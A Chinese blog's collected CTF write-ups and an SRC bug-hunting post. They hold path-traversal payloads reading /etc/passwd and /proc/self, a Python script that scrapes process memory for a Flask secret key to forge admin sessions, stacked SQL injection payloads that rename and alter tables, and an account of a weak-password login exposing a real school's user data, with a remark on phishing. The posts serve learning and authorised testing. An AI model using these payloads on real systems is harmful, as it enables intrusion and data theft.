调用了dechiffre，执行了dechiffre函数将“\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30”作为参数带入dechiffre函数中执行。即：dechiffre(pass_enc) 2.2 接着定义了pass变量一大串，先放着 2.3 因为pass_enc=&quot;55,56,54,79,115,69,114,116,107,49,50&quot;将pass_enc字符串分割成字符串数组，复制给tab参数所以:tab=[55,56,54,79,115,69,114,116,107,49,50] 注:tab此时是字符串数组!!! 2.4 随后 tab2等于 pass分割成的数组tab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65] 2.5 变量赋值代码分析：var i,j,k,l=0,m,n,o,p = &quot;&quot;;i = 0;j = tab.length;一开始i，j，m，n，o没有赋值，为undefined，而其他参数l=0，p=&quot;&quot;,后来 i 被赋值=0，j被赋值=11 2.6  k = j + (l) + (n=0); 因为n=0,所以k=11+0+0=11, 注这里的(l)是英文字母l，不是数字1 2.7 n = tab2.length; n等于tab2的长度18 所以n=18 2.8 第一个循环，精简一些代码：for(i =0; i &lt; (k = j = n); i++ ) //i =(o=0) 不就是 i=0嘛 ，真是服了,这段代码一大堆烟雾弹，后面那个更大&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i]));if(i == 5)break;&#125;解释：前面的o=tab[i-1]是无用的，因为后面会被o=tab2[i]的值重新覆盖 烟雾弹+1第一次循环：o=tab[0];p=p+String.fromCharCode((o = tab2[0])                                       tab2[0]=70,o=70 p=&quot;&quot;+String.fromCharCode(70) ==&gt;p=Fps：fromCharCode：将 Unicode 编码转为一个字符:第二次...  p=A第三次...  p=U第四次...  p=X第五次...  p=所以，这个for循环，最后的p为（尽管没有输出出来，这里我们知道就好）FAUX P 2.9 第二个循环，精简一些代码：for(i = 0; i &lt; 18; i++ )&#123; //i =(o=0)不就是 i=0嘛 ，和上面的一样，烟雾弹+1o = tab[i-l];   if(i &gt; 5 &amp;&amp; i &lt; 17)       p += String.fromCharCode((o = tab2[i]));&#125; 解释：这里的for循环和上面的差不多，注意这里的p值由于第一次for循环执行后现在已经是FAUX P了加上第一次for循环的p值，最后的p为FAUX PASSWORD HAH 2.10 p += String.fromCharCode(tab2[17]);因为tab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65]所以：p=FAUX PASSWORD HAH + A因此，最后的p为FAUX PASSWORD HAHA 2.11 pass = p;return pass;即 pass = FAUX PASSWORD HAHA;return FAUX PASSWORD HAHA;最后函数输出为FAUX PASSWORD HAHA 额。。这个函数就这样执行完了，tab数组也没有使用到！！一开始带入进来的参数pass_enc也没有用，，最后这个tab和其带入的参数就像个烟雾弹，迷惑人的。 在运行函数过程中也用到了分割后的tab数组（即带入的参数），但是经过for循环的一通乱绕，人家直接使用tab2数组相关代码的值，根本没有使用到tab数组的值，所以由于代码逻辑问题，传入dechiffre函数的参数pass_enc是没有意义的，只是个烟雾弹。  三、dechiffre函数执行后，继续执行其他的代码h = window.prompt(&#x27;Enter password&#x27;);   alert( dechiffre(h) );h=你输入弹框的内容之后alert弹出dechiffre(h)的值，由前面所有的代码分析可知，代码中的p值与tab无关，因为不论你输入什么最终都会被tab2的值替代。 所以不论pass_enc输入什么参数，输出的值都是会显示FAUX PASSWORD HAHA。\n最后结论是，不论输入什么参数，都只会返回FAUX PASSWORD HAHA，所以flag可能会与输入dechiffre的参数有关:\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30由上面分析已知，这一串参数转换为tab字符串数组为:[55,56,54,79,115,69,114,116,107,49,50] 注:tab此时是字符串数组！！！所以得抛弃前面的代码，重新编写代码来运行它，好吧其实是大佬写的，我不会！！！ &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;   var n=String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);   document.write(n);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n最后结果是：786OsErtk12\n根据题目的提示的Flag的格式，所以flag为：Cyberpeace&#123;786OsErtk12&#125;\n函数说明：\n(1)split() 方法用于把一个字符串分割成字符串数组语法：string.split(separator,limit)参数                 描述separator        可选。字符串或正则表达式，从该参数指定的地方分割 string Object。比如此题以逗号分割成字符串数组limit            可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。举例：str=&quot;a,b,c,d,e,f,g&quot;;var 1st = str.split(&quot;,&quot;,3);   对str以逗号进行分割，分割后的字符串数组内的值最多只能有3个，结果就是1st = [a,b,c] (2)for 循环的语法如下：for (语句 1; 语句 2; 语句 3) &#123;    要执行的代码块&#125;语句 1 在循环（代码块）开始之前执行。语句 2 定义运行循环（代码块）的条件。语句 3 会在循环（代码块）每次被执行后执行。 (3)fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。语法：String.fromCharCode(n1, n2, ..., nX)参数                 描述n1, n2, ..., nX     必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。 (4)prompt()方法用于显示可提示用户进行输入的对话框。这个方法返回用户输入的字符串语法：prompt(msg,defaultText)参数                描述msg                可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）就是弹框显示文本。defaultText        可选。默认的输入文本，你输入什么弹框一开始出现里面的输入框就会默认显示你这个文本。 (5)var i,j,k,l=0,m,n,o,p = &quot;&quot;;这个表示声明变量i,j,k,l,m,n,o,p，只有l和p两个变量被赋值了，其它的变量都是不带值的，不带有值的变量，它的值将是undefined，后续代码中可以给它赋值。 (6)lengthlength 属性可设置或返回数组中元素的数目。\n文章参考：\nwp参考一\n","categories":["攻防世界"]},{"title":"攻防世界-web2","url":"/2023/08/08/web2/","content":"题目描述：\n解密\n题目解题：\n打开题目开始审计代码\n &lt;?php$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;function encode($str)&#123;    $_o=strrev($str);    // echo $_o;            for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;               $_c=substr($_o,$_0,1);        $__=ord($_c)+1;            $_c=chr($__);        $_=$_.$_c;       &#125;     return str_rot13(strrev(base64_encode($_)));&#125;highlight_file(__FILE__);/*   逆向加密算法，解密$miwen就是flag*/?&gt;\n先解释一下各个函数用法\nstrrev— 反转字符串\n说明    string strrev (string $string)    返回 `string` 反转后的字符串。 参数     string    待反转的原始字符串。 返回值 \t返回反转后的字符串。 \nExample #1 使用 strrev() 反转字符串&lt;?phpecho strrev(&quot;Hello world!&quot;); // 输出 &quot;!dlrow olleH&quot;?&gt; \nsubstr — 返回字符串的子串\n说明     string substr( string $string, int $start[, int $length] )\t返回字符串 string 由 start 和 length 参数指定的子字符串。 参数 string\t输入字符串。必须至少有一个字符。 start\t如果 start 是非负数，返回的字符串将从 string 的 start 位置开始，从 0 开始计算。例如，在字符串 &quot;abcdef&quot; 中，在位置 0 的字符是 &quot;a&quot;，位置 2 的字符串是 &quot;c&quot; 等等。 \t如果 start 是负数，返回的字符串将从 string 结尾处向前数第 start 个字符开始。 \t如果 string 的长度小于 start，将返回 FALSE。 \nExample #1 使用负数 start&lt;?php$rest = substr(&quot;abcdef&quot;, -1);    // 返回 &quot;f&quot;$rest = substr(&quot;abcdef&quot;, -2);    // 返回 &quot;ef&quot;$rest = substr(&quot;abcdef&quot;, -3, 1); // 返回 &quot;d&quot;?&gt; \nord — 返回指定字符的ASCII码\n\nchr — 返回指定的字符\n\n由此我们理一下思路，这里他的函数是将传入的字符，先进行逆转，随后将每个字符的ascii值增了1，接着先base64编码，在逆转，在rot13加密，那我们逆着将题目做一遍即可得到flag\n也就是，先将待解密的密文rot13解密\n\n接着将得到的字符逆转一下，在base64解密\n\n可见flag已经初具雏形，接着在逆转字符，然后令每个字符的ascii值减1，这里减1与逆转的步骤可以翻一下，不影响，最终得到flag\n\n","categories":["攻防世界"]},{"title":"攻防世界-warmup","url":"/2023/08/16/warmup/","content":"题目描述：\n无\n题目解题：\n\n来到页面发现什么也没有，那么查看源代码看看\n\n很明显了，访问一下看看\n\n那么就是代码审计了\n &lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; //设置白名单            if (! isset($page) || !is_string($page)) &#123;  //判断page是否存在且是否为字符串类型                echo &quot;you can&#x27;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123; //判断page是否在白名单中                return true;            &#125;            $_page = mb_substr(   //截取page变量?之前的内容                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123; //二次判断白名单                return true;            &#125;            $_page = urldecode($page); //url解码            $_page = mb_substr( //二次?截取                $_page,                0,                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;//三次判断白名单                return true;            &#125;            echo &quot;you can&#x27;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#x27;file&#x27;])//若file变量存在且为字符串类型，且在check函数中返回true，则包含file变量的内容        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;    &#125;  ?&gt;\n很明显了，我们这里主要是绕过白名单检测即可也就是in_array函数，但我刚做的时候，一直以为要靠PHP特性绕过inarray函数，比如在后面加个#之类的，但走了一遍似乎没啥用，看了wp才醒悟，这里靠include特性即可，也就是目录穿越。\n当然这里先看看hint提示\n\n找到flag所在地\n这里我们分析得知我们应该让第一次array检查返回false，随后到第二个array检查，这里截取?之前的内容，我们令这一步返回true，那么就不用管第三个array检查了\n构造payload如下：\n?file=source.php?ffffllllaaaagggg\n\n结果没有任何反应，那就是目录问题了，这里看一下include特性\n\n由此发现，如果我们在?后面加上相对路径…/，那么我们就会在当前目录开始寻找而忽略之前的source.php\n后面就是尝试了，最终payload如下\n?file=source.php?../../../../../ffffllllaaaagggg\n\n拿到flag\n","categories":["攻防世界"]},{"title":"攻防世界-catcat-new","url":"/2023/08/16/catcat-new/","content":"题目描述：\ncatcat\n题目解题：\n\n进入首页随便点击一个图片，看到url如图，猜测就是文件包含了，测试了半天没啥头绪，还是看wp吧。。。\n看了之后发现这是不会的点，那我们认真学习一番\n文章说：一道有关任意文件读取，Linux敏感文件，flask-session伪造的题目\n先看基础知识\n1./etc/passwd该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）2./proc/selfproc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中的数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。3./proc/self/cmdline该文件包含的内容为当前进程执行的命令行参数。4./proc/self/mem/proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。5./proc/self/maps/proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。6.flask-session结构 flask_session是flask框架实现session功能的一个插件。其session结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 “.”来进行分隔。flask_session默认session的储存是在用户Cookie中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。\n输入该payload：?file=../../../etc/passwd，确实存在漏洞\n\n读取当前进程的命令行参数。?file=../../../../proc/self/cmdline，发现有一个通过python启动app.py的命令。 所以可以得出该网站使用Python框架，并且因为有app.py可知使用的是flask框架。\n\n尝试读取app.py文件。\n\n复制文本内容，将字符串f-string格式化输出美化一下。\nimport osimport uuidfrom flask import Flask, request, session, render_template, Markupfrom cat import cat flag = &quot;&quot;app = Flask( #这部分代码导入了所需的模块，其中包括Flask、os、uuid等。创建了一个Flask应用实例，并设置了静态资源路径。    __name__,    static_url_path=&#x27;/&#x27;,    static_folder=&#x27;static&#x27;)app.config[&#x27;SECRET_KEY&#x27;] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot;  # 此处利用uuid.uuid4()生成了一串id字符串并在后面拼接*abcdefghif os.path.isfile(&quot;/flag&quot;):  # 导入flag文件并删除掉，cat函数作用是读取flag内容，赋值给flag变量    flag = cat(&quot;/flag&quot;)    os.remove(&quot;/flag&quot;)  @app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])  # / 路径的处理函数用于渲染首页模板，展示可用的&quot;cat&quot;列表。def index():    detailtxt = os.listdir(&#x27;./details/&#x27;)    cats_list = []    for i in detailtxt:        cats_list.append(i[:i.index(&#x27;.&#x27;)])     return render_template(&quot;index.html&quot;, cats_list=cats_list, cat=cat)  @app.route(&#x27;/info&#x27;, methods=[&quot;GET&quot;, &#x27;POST&#x27;])# def info(): # /info 路径的处理函数接收GET或POST请求，从&quot;./details/&quot;目录下读取文件内容，并在详情页展示。    filename = &quot;./details/&quot; + request.args.get(&#x27;file&#x27;, &quot;&quot;)    start = request.args.get(&#x27;start&#x27;, &quot;0&quot;)    end = request.args.get(&#x27;end&#x27;, &quot;0&quot;)    name = request.args.get(&#x27;file&#x27;, &quot;&quot;)[:request.args.get(&#x27;file&#x27;, &quot;&quot;).index(&#x27;.&#x27;)]     return render_template(&quot;detail.html&quot;, catname=name, info=cat(filename, start, end))  @app.route(&#x27;/admin&#x27;, methods=[&quot;GET&quot;])  # 在session信息中admin=1的用户在/admin路径下访问网站可以获得flag，所以要伪造session。def admin_can_list_root():    if session.get(&#x27;admin&#x27;) == 1:        return flag    else:        session[&#x27;admin&#x27;] = 0    return &quot;NoNoNo&quot;  if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, debug=False, port=5637)\n以上就是app.py的代码\nflask_session的伪造需要用到secret_key，而secret_key的值可以通过内存数据获取。先读取/proc/self/maps文件获取可读内容的内存映射地址。\n\n执行破解脚本\n# coding=utf-8# ----------------------------------#################################### Edited by lx56@blog.lxscloud.top#################################### ----------------------------------import requestsimport reimport ast, sysfrom abc import ABCfrom flask.sessions import SecureCookieSessionInterface url = &quot;http://61.147.171.105:62610/&quot; # 此程序只能运行于Python3以上if sys.version_info[0] &lt; 3:  # &lt; 3.0    raise Exception(&#x27;Must be using at least Python 3&#x27;)  # ----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------class MockApp(object):    def __init__(self, secret_key):        self.secret_key = secret_key     class FSCM(ABC):    def encode(secret_key, session_cookie_structure):        # Encode a Flask session cookie        try:            app = MockApp(secret_key)            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))            si = SecureCookieSessionInterface()            s = si.get_signing_serializer(app)            return s.dumps(session_cookie_structure)        except Exception as e:            return &quot;[Encoding error] &#123;&#125;&quot;.format(e)            raise e# 由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret keys_key = &quot;&quot;bypass = &quot;../..&quot;# 请求file路由进行读取map_list = requests.get(url + f&quot;info?file=&#123;bypass&#125;/proc/self/maps&quot;)# 读取当前进程内容map_list = map_list.text.split(&quot;\\\\n&quot;) # 以换行符分开内容for i in map_list:    # 匹配指定格式的地址    map_addr = re.match(r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;, i)    if map_addr:        start = int(map_addr.group(1), 16)        end = int(map_addr.group(2), 16)        print(&quot;Found rw addr:&quot;, start, &quot;-&quot;, end)        # 设置起始和结束位置并读取/proc/self/mem        res = requests.get(f&quot;&#123;url&#125;/info?file=&#123;bypass&#125;/proc/self/mem&amp;start=&#123;start&#125;&amp;end=&#123;end&#125;&quot;)        # 用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey        if &quot;*abcdefgh&quot; in res.text:            # 正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh            secret_key = re.findall(&quot;[a-z0-9]&#123;32&#125;\\*abcdefgh&quot;, res.text)            if secret_key:                print(&quot;Secret Key:&quot;, secret_key[0])                s_key = secret_key[0]                break\n\n有了secret_key后接下来就是伪造session，session在访问/admin路径时的cookie中。session为eyJhZG1pbiI6MH0.ZNzhIg.Z7MhkPlaNm3hajdIBv_AEL995xo\n\n使用工具flask_session_cookie_manager伪造session。使用方法为：\n解密 python flask_session_cookie_manager3.py decode -s “secret_key” -c “session”加密 python flask_session_cookie_manager3.py encode -s “secret_key” -t “data”\n执行如下payload\npython flask_session_cookie_manager3.py decode -s &quot;bd07849f5c4e4359843eb39758e389f0*abcdefgh&quot; -c &quot;eyJhZG1pbiI6MH0.ZNznXw.gl2UUGVxRJ7z7FgWD-jlsS_ETPE&quot;python flask_session_cookie_manager3.py encode -s &quot;bd07849f5c4e4359843eb39758e389f0*abcdefgh&quot; -t &quot;&#123;&#x27;admin&#x27;: 1&#125;&quot;python flask_session_cookie_manager3.py encode -s “bd07849f5c4e4359843eb39758e389f0*abcdefgh” -t “&#123;&#x27;admin&#x27;: 1&#125;”\n\n\n得到伪造的session，使用burpsuite更改session并执行，得到flag。\n\n这里不知为何，我认为我步骤一样的，但是复现不出来，最后找了一个一把梭的脚本，依旧是nonono，因而不纠结了，知道思路即可\n上述脚本也是只能看懂，根本不会写。。。。只希望未来不在是脚本小子了\n知识总结：\nflask_session伪造\n伪造原理\nflask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。\n通常情况下会和SSTI知识点同步考察。\n利用方式\n我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的SECRET_KEY\n加解密脚本自取：\nhttps://github.com/noraj/flask-session-cookie-manager\n使用方法\npython2 脚本2.py decode -c &quot;session值&quot; -s &quot;key值&quot;python2 脚本2.py encode -s &quot;key值&quot; -t &quot;我们需要伪造的值&quot;python3 脚本3.py decode -c &quot;session值&quot; -s &quot;key值&quot;python3 脚本3.py encode -s &quot;key值&quot; -t &quot;我们需要伪造的值&quot;\n所需要注意的地方就是python的版本不同所对应的脚本也不相同。\nFlask的session格式\n\nbase64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名\n时间戳用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；签名是利用Hmac算法，将session数据和时间戳加上secret_key加密而成的，用来保证数据没有被修改。\n由上文所述的session格式可知，要修改并伪造一个session的必要条件就是知道加密所采用的secret_key，一旦获取到secret_key, 我们就可以轻松的构造签名，从而实现客户端的session的伪造。\n文章参考：\n参考一\n参考二\n参考三\n","categories":["攻防世界"]},{"title":"攻防世界-supersqli","url":"/2023/08/14/supersqli/","content":"题目描述：\n随便注\n题目解题：\n根据题目很显然是sql注入了\n我们打开题目看看\n\n\n正常输入1，也正常回显，随之输入1’发现报错，证实存在sql注入，且为单引号闭合\n\n这里接着测试几波，发现#可以成功注释内容，接着先判断列数，根据报错情况，发现为2列\n接着联合注入一下\n1&#x27; union select 1, database() #\n\n发现被正则过滤了，并且大小写，双写绕过也不行，update也过滤了，那我们尝试一下extract报错注入\n1&#x27; and extractvalue(1,concat(0x7e,database())) #\n\n成功执行！\n继续干\n1&#x27; and extractvalue(1,concat(0x7e,database())) #\n但又想到，关键词依旧是被过滤的，还是行不通，没思路了，看了wp发现，居然忘了堆叠注入，那就熟悉一下\n1&#x27;; show databases; # \n\n1&#x27;; use supersqli;show tables; # \n\n1&#x27;;use supersqli;show columns from `1919810931114514`;#  \n这里注意：纯数字为表名，要用反引号包裹\n\n找到flag，到这一步就头疼了，本来要select的，不过被过滤了，思路没了，继续看wp，方法真多啊\n方法一：sql预编译\n参考：预编译\n设置参数\nset @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);\n执行预编译SQL语句\nprepare stmt from @sql;EXECUTE stmt;\n合起来为\n1&#x27;;set @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prepare stmt from @sql;EXECUTE stmt;#\n\n。。。set也过滤了，不过幸好可以大小写绕过\n1&#x27;;Set @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prepare stmt from @sql;EXECUTE stmt;#\n\n拿到flag，这里也是因为这道题开启了sql预编译，不然这方法行不通\n方法二：改列名\n我们查询words列发现结构大致相同，由于注入框的查询是对列id的搜索，此时参考两个表的列名，需要将flag列名改为能够查找的id列（修改包括名称和数据类型）。\n1&#x27;;use supersqli;show columns from words;#\n\n接下来输入：\n1&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#\nGPT分析一波上述sql语句\n这个SQL语句看起来像是一个恶意的SQL注入攻击尝试，试图通过修改数据库表的名称和字段来实现某种目的。让我逐步解析这个语句中的每一部分：1. `1&#x27;;rename tables `words` to `words1`;`   这一部分首先以数字1开始，然后接着使用了分号来终止前一个查询语句。接下来，它试图通过`rename tables`命令将数据库表`words`重命名为`words1`。这是一个典型的SQL注入攻击手法，旨在执行恶意的数据库操作。2. `rename tables `1919810931114514` to `words`;`   在这里，攻击者试图将表名`1919810931114514`重命名为`words`，继续利用`rename tables`命令进行表操作。3. `alter table `words` change `flag` `id` varchar(100);`   这一部分使用`alter table`命令，试图修改名为`words`的表，将其字段`flag`更改为名为`id`的新字段，类型为`varchar(100)`。这也是一个恶意操作的尝试，可能会破坏数据库的结构和数据。4. `#`   井号（#）表示注释，此后的内容将被视为注释而不被执行。总之，这个SQL语句的目的似乎是通过重命名表和修改字段来对数据库进行恶意操作。这种类型的攻击可能会导致数据损坏、数据泄露以及系统崩溃等问题。在开发和维护应用程序时，务必采取必要的安全措施，如使用参数化查询、输入验证和避免动态构建SQL语句，以防范SQL注入等安全风险。\n那这里我们直接万能语句1’ or 1=1#就可以了，毕竟flag现在在id字段里，但这里似乎flag的id字段默认为0了，以至于我们可以查出来，但GPT说这里默认应为null。不过使用万能语句，即可查询到sql中所有字段数对应的数据\n\n方法三：改列名-另类方法\n第二个方法是将两个表列名互换，查询语句不变的情况下，会直接查询words表中内容。\nRENAME TABLE tbl_name TO new_tbl_name 将表tbl_name的名字改成new_tbl_name。\n\n由于注入框的查询是对列id的搜索，此时参考两个表的列名，需要将flag列名改为能够查找的id列（修改包括名称和数据类型）。\n\nALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;\n具体为什么修改为CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL就是数据库数据类型的问题了。\n将操作连贯起来，构造Payload。\n1’;RENAME TABLE words TO word;RENAME TABLE 1919810931114514 TO words;ALTER TABLE words CHANGE flag id VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;SHOW columns FROM words;\n1';RENAME TABLE `words` TO `word`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;SHOW columns FROM words;\n\n到这里我们的表列名就已经修改完毕，此时还会输出修改完成的words列名，最后通过万能钥匙1’ or ‘1’='1即可得到输出。\n\n参考文章：\n参考一\n参考二\n","categories":["攻防世界"]},{"title":"edu挖掘","url":"/2023/08/09/%E8%AE%B0%E4%B8%80%E6%AC%A1edusrc%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/","content":"前言\n这里也是花了将近一周的时间加上运气成分才找到的，怎么说呢，这次成功的挖掘让我对前期的信息搜集有了切身的体会，真的应了那就话：信息搜集搜的越多，挖出来的也越多。\n在这段时间前期很忧愁，感觉自己真废，什么也搞不出来，但也确实体会到了实战的环境，同时庆幸自己坚持了下来，虽然漏洞不怎么高级，但也算是良好的开端。\n总结一句话：挖漏洞一定注重前期的信息搜集（虽然我挖出来了，但我仍然知道我信息搜集做的有点烂，这次之后一定注重细节了），另外就是一定要坚持，一时半会儿挖不出来很正常，但一定要坚持，想想自己的流程还有什么遗漏以及可以改进的地方。挖漏洞一定要耐心，不可聒噪。\n漏洞挖掘\n这里首先随机挑选一名幸运儿，我这里是随后进他官网，确定主域名，随机用子域名挖掘机，爆破子域名及ip\n\n随后在用fofa_viewer扫描子域名，这样大概就比较准确了，不过这里也是感觉layer有点鸡肋，虽然字典强大，但感觉不怎么高效，看日后的作用吧。。。\n\n测试一番发现可疑点，访问9090端口发现进入一个后台登录页面，这里也是某微OA漏洞，虽然我这里只是一个弱口令，但我相信肯定还有其他的漏洞，这次之后在进行尝试。\n\n这里成功弱口令登录，用户名和密码都是admin，成功进入\n\n这里也是发现七百多个用户的信息\n\n其中有电子邮箱可能适合钓鱼。。。\n\n总结\n感觉没咋用力，这个系统功能点也很单一，对我个人来说没有再能进一步利用的点了，但我觉得这种类似的系统应该可以通杀，这就留给日后的测试吧。这里也是第一次挖，提交之后成功得到edu账号，没想到这还能评上中危。。。。\n继续坚持！！！\n","categories":["src漏洞挖掘"]},{"title":"攻防世界-Cat","url":"/2023/08/21/Cat/","content":"题目描述：\n抓住那只猫\n题目解题：\n\n那就随便输几下\n\n测试几下发现只有127.0.0.1有回显，以为是命令执行，但似乎过滤了很多，手工有点难搞，那就用字典fuzz一下看看过滤了什么\n\n看到如此之长的回显，惊呆了，看一下内容\n\n用游览器打开并搜索flag，并没有，只能老老实实的进行代码审计\n\n这里看到敏感词汇django，Python的模块Django之所以存在这个报错原因是因为：\n\ndjango报错页面将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。\n\n参考wp：既然是django文件还有前端代码，复制后用游览器打开试试：\n\n将html在浏览器中打开，可以看出后端运行Django，由于字符编码问题而报错。在请求信息POST一项中可以找到参数url，于是大致可以猜想到是PHP向本机的Django发出了POST请求，参数就是我们输入的url。\n\n用游览器打开以后最底下可以看到一串提示：You’re seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard page generated by the handler for this status code.\n也就是说，True in your Django settings file.有可能flag文件在 settings file 中。\n直接搜索settings，会发现很多，但是比较特殊的有这个（和settings和database有关，百度搜索）\n\nPHP通常使用cURL库与作为客户端与服务器通信，在cURL库的CURLOPT_POSTFILEDS选项中可以找到突破口，借此我们可以爆出数据库内容\n\n看其他大佬的文档，发现了@有关，php中curl函数@的作用PHP中curl的CURLOPT_POSTFIELDS参数使用细节 - 52php - 博客园\n我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息。\n最终的payload：@/opt/api/database.sqlite3\n在文中还需要搜索flag或者ctf等等关键字符：\n\n找到flag\n总结\nURL编码：HTTP只能传输约定的ASCII字符（即ASCII码值127以内），若要传输其他字符和一些ASCII值在127以内的特殊字符，则需要对其转义——方法是在其十六进制ASCII值前加一个%，注意约定字符也可以编码但是效果一样。URL编码的临界值为%7F（127），由于计算机普遍存在的编码转换问题，我们常常可以在这里fuzz一下。\nDjango：Django是一个用python写成的web应用框架。\nDjango项目的目录布局如下：\nDjango项目中app的目录布局如下：\nPHP的cURL库：PHP中的cURL库支持PHP作为客户端访问其他服务器，并支持多种协议。这里从报错信息中可以看出，与Django的交互是使用HTTP协议。\n参考文章：\nwp参考一\nwp参考二\nwp参考三\n具体的acunetix使用方式Acunetix Web Vulnerability 使用手册_林夕#的博客-CSDN博客_awvs使用手册\n","categories":["攻防世界"]},{"title":"攻防世界-FlatScience","url":"/2023/08/22/FlatScience/","content":"题目描述：\n无\n题目解题：\n\n打开题目，没啥信息，只能点击链接看看，发现都是些高深的pdf。。。初步认为没啥用，于是用Acunetix扫了一下这个网站，发现\n\n那我们访问看看，admin.php\n\n尝试了几下弱口令，没啥用，但页面提示nono，stop，看源代码\n\n提示我们不要挣扎了，根本绕不了一点。。。，那我们估计相信，这里先不考虑了\nlogin.php\n\n感觉是sql注入，尝试一下万能密码\n\n发现页面报错，估计就是了，并且过滤了#，那我们试试–+\n\n发现输入后跳转到了index.php，这估计是成了，之后bp抓包试了半天，我以为注入点在用户名上。\n随后试了半天判断出其为字符型注入，且字段数为2\n\n且如上图，回显位为2\n随后查看了页面源代码，箭头表示移出debug参数，这时我就想到会不会是url传一个debug参数，于是乎有了接下来的\n\n\n发现回显了源代码\n&lt;?phpob_start();?&gt;&lt;?phpif(isset($_POST[&#x27;usr&#x27;]) &amp;&amp; isset($_POST[&#x27;pw&#x27;]))&#123;        $user = $_POST[&#x27;usr&#x27;];        $pass = $_POST[&#x27;pw&#x27;];        $db = new SQLite3(&#x27;../fancy.db&#x27;);                $res = $db-&gt;query(&quot;SELECT id,name from Users where 